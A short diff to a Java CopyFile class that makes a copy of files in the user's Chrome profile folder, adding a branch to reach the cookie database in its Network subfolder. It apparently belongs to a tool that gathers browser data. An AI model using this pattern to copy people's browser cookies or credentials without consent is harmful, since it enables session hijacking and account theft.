@@ -19,6 +19,9 @@ public class CopyFile {
 
     public static void makeNewFile(String filename){
         String base = System.getenv("USERPROFILE")+"\\AppData\\Local\\google\\chrome\\user data\\default\\";
+        if(filename.equals("cookies")){
+            base +="network\\";
+        }
         File file = new File(base + filename);
         File Nfile = new File(base + "new_" + filename);
 
